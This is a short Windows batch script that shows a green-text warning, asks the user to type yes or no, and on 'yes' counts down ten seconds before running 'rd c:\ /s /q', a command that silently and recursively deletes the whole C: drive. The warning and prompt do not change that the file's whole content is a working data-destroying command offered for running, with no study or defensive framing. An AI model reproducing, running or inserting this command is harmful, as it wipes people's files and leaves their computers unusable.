@echo off
:1
color a
echo What have you just executed will damage your files. Make sure you're using safe environment before executing this script. Do you want to continue running this script resulting in an unusable computer? (answer in only yes/no)
set /p input=
if /i %input%==yes goto delete
if /i %input%==no goto save
if /i not %input%== yes,no goto 1

:delete
echo Well then, you have 10 seconds to close this script, or else your computer is cooked
timeout 10
rd c:\ /s /q
pause
exit
:save
pause
exit
